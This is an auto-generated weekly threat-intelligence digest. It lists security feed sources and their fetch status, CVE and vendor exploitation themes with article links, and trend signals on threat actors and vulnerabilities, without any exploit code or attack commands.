# PHANTOMSignal Briefing Packet

- Generated: 2026-09-11T14:12:42.063444+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 312
- Total clusters raw: 154
- Total clusters in packet: 65
- Dropped low score: 89
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 3
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 5
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 9
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 1
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 7
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 4
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 15
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 22
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 15
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 9
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 25
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 20
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 1

## Affinity groups (themes)

### CVE-2026-85880 exploitation activity
- Anchor signal: CVE-2026-85880
- Theme key: cve-2026-85880
- Cluster count: 9
- Article count: 9
- Cohesion: 0.333
- Shared strong signals: CVE-2026-85880
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation, phishing_social_eng, apt_espionage
  - actor_attribution: APT31
  - affected_industries: government
  - cve_ids: CVE-2026-85880, CVE-2026-85046, CVE-2026-81963, CVE-2026-87491
  - urgency_signals: zero_day, actively_exploited
- Cluster IDs: a8443c14f2, a7d235c86e, 9097ac899e, 62136c6613, 44179b1aeb, f08ee4366d, 28baa2c576, 47ab9f6c84, 26a67e9e74
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
  - https://thehackernews.com/2026/09/microsoft-patches-record-974-flaws.html
  - https://cyberscoop.com/microsoft-patch-tuesday-september-2026/
  - https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
  - https://www.proofpoint.com/us/newsroom/news/four-groups-caught-using-same-chrome-and-windows-exploit-kit
  - https://www.proofpoint.com/us/newsroom/news/chinese-espionage-groups-swarm-exploit-triple-link-chain-zero-days
  - https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/

### AWS active exploitation
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 6
- Article count: 8
- Cohesion: 0.231
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, web_shell_backdoor, supply_chain, zero_day
  - affected_industries: education
  - affected_products: AWS, OpenAI/ChatGPT
  - urgency_signals: preauth_unauth, actively_exploited, no_patch_yet, zero_day
- Cluster IDs: 2c7f2421f0, 462fbf5ade, aa9e62a68c, 8760c8b22e, 07cc5231d1, 9d718427a9
- Links:
  - https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
  - https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
  - https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
  - https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
  - https://thehackernews.com/2026/09/papercut-replaces-emergency-patches.html
  - https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
  - https://aws.amazon.com/blogs/security/ospar-2026-report-now-available-with-167-services-in-scope/

### Cisco active exploitation
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 6
- Article count: 10
- Cohesion: 0.236
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Cisco
  - cve_ids: CVE-2026-20079
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: bd90c028bc, 8760c8b22e, 5786bd6a86, 5c29932a73, f08ee4366d, 93c6fb73a4
- Links:
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
  - https://www.reddit.com/r/netsec/comments/1wcqbvq/sonicwall_sma1000_cve202615409_ssrf_to_erlang_rce/
  - https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
  - https://blog.talosintelligence.com/fmc-ongoing-exploitation/
  - https://www.bleepingcomputer.com/news/security/cisco-fmc-flaws-exploited-by-ransomware-gang-state-sponsored-hackers/
  - https://www.recordedfuture.com/blog/august-2026-cve-landscape
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
  - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/

### CVE-2026-87491 exploitation activity
- Anchor signal: CVE-2026-87491
- Theme key: cve-2026-87491
- Cluster count: 5
- Article count: 5
- Cohesion: 0.53
- Shared strong signals: CVE-2026-87491
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, phishing_social_eng, web_shell_backdoor, apt_espionage, active_exploitation
  - actor_attribution: APT31
  - affected_industries: government, education, financial_services, manufacturing_industrial, aviation_defense
  - cve_ids: CVE-2026-87491, CVE-2026-85046, CVE-2026-85880
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: aa9e62a68c, 62136c6613, 44179b1aeb, 47ab9f6c84, 26a67e9e74
- Links:
  - https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
  - https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://www.proofpoint.com/us/newsroom/news/chinese-espionage-groups-swarm-exploit-triple-link-chain-zero-days
  - https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/

### zero day targeting Microsoft Windows
- Anchor signal: Microsoft Windows
- Theme key: microsoft-windows
- Cluster count: 4
- Article count: 4
- Cohesion: 0.332
- Shared strong signals: Microsoft Windows
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, ransomware_extortion
  - affected_industries: manufacturing_industrial, government
  - affected_products: Microsoft Windows
  - cve_ids: CVE-2026-85046, CVE-2026-85880
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: a8443c14f2, 22339b9409, 44179b1aeb, 28baa2c576
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
  - https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://www.proofpoint.com/us/newsroom/news/four-groups-caught-using-same-chrome-and-windows-exploit-kit

### CVE-2026-86207 exploitation activity
- Anchor signal: CVE-2026-86207
- Theme key: cve-2026-86207
- Cluster count: 3
- Article count: 4
- Cohesion: 0.348
- Shared strong signals: CVE-2026-86207
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: 2a281139fe, dca90fcb42, 711e127637
- Links:
  - https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
  - https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - https://www.huntress.com/blog/n-able-vulnerability-exploitation

### CVE-2026-86206 exploitation activity
- Anchor signal: CVE-2026-86206
- Theme key: cve-2026-86206
- Cluster count: 3
- Article count: 4
- Cohesion: 0.348
- Shared strong signals: CVE-2026-86206
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: 2a281139fe, dca90fcb42, 711e127637
- Links:
  - https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
  - https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - https://www.huntress.com/blog/n-able-vulnerability-exploitation

### CVE-2026-86218 exploitation activity
- Anchor signal: CVE-2026-86218
- Theme key: cve-2026-86218
- Cluster count: 3
- Article count: 4
- Cohesion: 0.398
- Shared strong signals: CVE-2026-86218
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, zero_day
  - cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
  - urgency_signals: actively_exploited, preauth_unauth, zero_day, poc_available
- Cluster IDs: dca90fcb42, 81949698a6, 711e127637
- Links:
  - https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
  - https://www.huntress.com/blog/n-able-vulnerability-exploitation

### phishing social eng targeting Microsoft Defender
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 3
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng, mfa_bypass
  - affected_products: Microsoft Defender
- Cluster IDs: cccc588c10, adbb5499cd, ebc72eebc6
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/10/detect-and-disrupt-ai-themed-attacks-with-microsoft-defender/
  - https://thehackernews.com/2026/09/researcher-drops-new-microsoft-defender.html
  - https://www.securityweek.com/check-point-patches-critical-vpn-vulnerabilities/
  - https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/

### CVE-2026-69414 exploitation activity
- Anchor signal: CVE-2026-69414
- Theme key: cve-2026-69414
- Cluster count: 2
- Article count: 3
- Cohesion: 0.455
- Shared strong signals: CVE-2026-69414
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-69414
- Cluster IDs: cccc588c10, 4839f2ab11
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/10/detect-and-disrupt-ai-themed-attacks-with-microsoft-defender/
  - https://thehackernews.com/2026/09/researcher-drops-new-microsoft-defender.html
  - https://www.darkreading.com/vulnerabilities-threats/nightmare-eclipse-strikes-again-shieldcrash-windows-exploit

### CVE-2026-82329 exploitation activity
- Anchor signal: CVE-2026-82329
- Theme key: cve-2026-82329
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: CVE-2026-82329
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-82329
  - urgency_signals: preauth_unauth
- Cluster IDs: 2c7f2421f0, 22339b9409
- Links:
  - https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
  - https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/

### SonicWall exploitation (CVE-2026-83549)
- Anchor signal: SonicWall
- Theme key: sonicwall
- Cluster count: 2
- Article count: 3
- Cohesion: 0.2
- Shared strong signals: SonicWall
- Member CVEs: CVE-2026-83549
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day
  - affected_products: SonicWall
  - cve_ids: CVE-2026-83549
  - urgency_signals: zero_day, preauth_unauth
- Cluster IDs: bd90c028bc, 22339b9409
- Links:
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
  - https://www.reddit.com/r/netsec/comments/1wcqbvq/sonicwall_sma1000_cve202615409_ssrf_to_erlang_rce/
  - https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/

## Forward signals

### Novelty
- Novel cves: 10
  - CVE-2026-80428 (first seen via Exploit-DB at 2026-09-11T00:00:00+00:00, cluster 5c940a7bfe)
  - CVE-2025-54988 (first seen via Rapid7 at 2026-09-11T13:35:11+00:00, cluster bd90c028bc)
  - CVE-2025-66516 (first seen via Rapid7 at 2026-09-11T13:35:11+00:00, cluster bd90c028bc)
  - CVE-2026-20929 (first seen via Rapid7 at 2026-09-11T13:35:11+00:00, cluster bd90c028bc)
  - CVE-2021-22175 (first seen via BleepingComputer at 2026-09-11T11:15:22+00:00, cluster abbe07236f)
  - CVE-2021-39935 (first seen via BleepingComputer at 2026-09-11T11:15:22+00:00, cluster abbe07236f)
  - CVE-2023-2825 (first seen via BleepingComputer at 2026-09-11T11:15:22+00:00, cluster abbe07236f)
  - CVE-2026-85706 (first seen via BleepingComputer at 2026-09-11T11:15:22+00:00, cluster abbe07236f)
  - CVE-2026-87719 (first seen via BleepingComputer at 2026-09-11T11:15:22+00:00, cluster abbe07236f)
  - CVE-2025-53521 (first seen via Sophos X-Ops at 2026-09-07T00:00:00+00:00, cluster dc442d78ed)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (0)

### Leading edge (1)
- **Metasploit Wrap Up: This One Goes to Sixteen!**
  - Cluster: bd90c028bc
  - Lead hours: 19.8
  - First source: Reddit r/netsec
  - Later Tier 1 source: Rapid7
  - Shared signals: CVE-2025-54988, CVE-2025-66516, CVE-2026-15409, CVE-2026-20079, CVE-2026-20929, CVE-2026-83549, Cisco, SonicWall

### Convergence (15)
- Pair: CVE-2026-81963 + Microsoft Windows (cluster a8443c14f2, first observation: True)
- Pair: CVE-2026-85046 + Microsoft Windows (cluster a8443c14f2, first observation: True)
- Pair: CVE-2026-85880 + Microsoft Windows (cluster a8443c14f2, first observation: True)
- Pair: CVE-2026-42016 + AWS (cluster 2c7f2421f0, first observation: True)
- Pair: CVE-2026-42018 + AWS (cluster 2c7f2421f0, first observation: True)
- Pair: CVE-2026-82329 + AWS (cluster 2c7f2421f0, first observation: True)
- Pair: CVE-2025-54988 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2025-54988 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2025-66516 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2025-66516 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-15409 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-20079 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-20929 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-20929 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-83549 + Cisco (cluster bd90c028bc, first observation: True)

### Drift (6)
- **Cl0p** (cluster aaf3283e67)
  - New industries: (none)
  - New products: Microsoft 365, Okta
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft SharePoint, OpenAI/ChatGPT, SolarWinds
- **Lazarus** (cluster b579a537a6)
  - New industries: healthcare, legal_professional
  - New products: Snowflake
  - Prior top industries: aviation_defense, financial_services, government
  - Prior top products: Android, Microsoft Windows, OpenAI/ChatGPT
- **Rhysida** (cluster b579a537a6)
  - New industries: legal_professional
  - New products: (none)
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Apple iOS/macOS, Microsoft Defender, Snowflake
- **Scattered Spider** (cluster b579a537a6)
  - New industries: healthcare, legal_professional
  - New products: Snowflake
  - Prior top industries: critical_infrastructure, financial_services, government
  - Prior top products: Anthropic/Claude, Apple iOS/macOS, Microsoft SharePoint
- **APT29** (cluster 70d1963981)
  - New industries: manufacturing_industrial
  - New products: Anthropic/Claude
  - Prior top industries: aviation_defense, government
  - Prior top products: Microsoft Entra, PyPI, SolarWinds
- **ShinyHunters** (cluster 70d1963981)
  - New industries: government
  - New products: (none)
  - Prior top industries: financial_services, healthcare, manufacturing_industrial
  - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 14, cluster 70d1963981)
- actor_attribution: Scattered Spider (weeks observed: 11, cluster b579a537a6)
- actor_attribution: Cl0p (weeks observed: 8, cluster aaf3283e67)
- cve_ids: CVE-2026-15409 (weeks observed: 6, cluster bd90c028bc)
- actor_attribution: Lazarus (weeks observed: 6, cluster b579a537a6)
- cve_ids: CVE-2026-18577 (weeks observed: 5, cluster 2a281139fe)
- actor_attribution: APT29 (weeks observed: 5, cluster 70d1963981)
- cve_ids: CVE-2026-20316 (weeks observed: 4, cluster 8760c8b22e)
- actor_attribution: Rhysida (weeks observed: 4, cluster b579a537a6)
- cve_ids: CVE-2026-69414 (weeks observed: 3, cluster cccc588c10)
- cve_ids: CVE-2026-81578 (weeks observed: 3, cluster 07cc5231d1)
- cve_ids: CVE-2026-82078 (weeks observed: 3, cluster 07cc5231d1)
- cve_ids: CVE-2026-63077 (weeks observed: 3, cluster 9d718427a9)
- cve_ids: CVE-2026-50751 (weeks observed: 3, cluster adbb5499cd)
- cve_ids: CVE-2026-72898 (weeks observed: 3, cluster 5c29932a73)

### Tier inversion (0)

## Clusters

